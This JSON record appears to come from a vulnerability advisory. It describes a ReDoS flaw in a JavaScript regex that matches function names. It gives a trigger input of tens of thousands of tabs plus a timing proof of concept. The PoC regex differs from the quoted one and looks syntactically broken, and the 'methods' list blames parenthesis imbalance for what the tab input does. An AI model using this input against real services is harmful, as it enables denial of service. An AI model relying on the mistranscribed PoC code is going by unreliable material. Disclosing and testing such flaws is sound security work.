{"description": "The current regex implementation for parsing values in the module is susceptible to excessive backtracking, leading to potential DoS attacks. The regex implementation in question is as follows:\n\n```js\nconst functionNameMatch = /\\s*function(?:\\s|\\s*\\/\\*[^(?:*/)]+\\*\\/\\s*)*([^\\s(/]+)/;\n```\n\nThis vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:\n\n```js\n'\\t'.repeat(54773) + '\\t/function/i'\n```\n\nHere is a simple PoC code to demonstrate the issue:\n\n```js\nconst protocolre = /\\sfunction(?:\\s|\\s/*[^(?:*\\/)]+*/\\s*)*([^\\(\\/]+)/;\n\nconst startTime = Date.now();\nconst maliciousInput = '\\t'.repeat(54773) + '\\t/function/i'\n\nprotocolre.test(maliciousInput);\n\nconst endTime = Date.now();\n\nconsole.log(\"process time: \", endTime - startTime, \"ms\");\n```", "methods": ["Used a regular expression denial of service (ReDoS) attack to cause excessive backtracking and CPU load.", "Exploited an imbalance in parentheses to trigger the vulnerability.", "Used a malicious input string to demonstrate the issue, consisting of a large number of tabs followed by a function name.", "Demonstrated the vulnerability using a simple PoC code that measures the processing time of the malicious input."]}
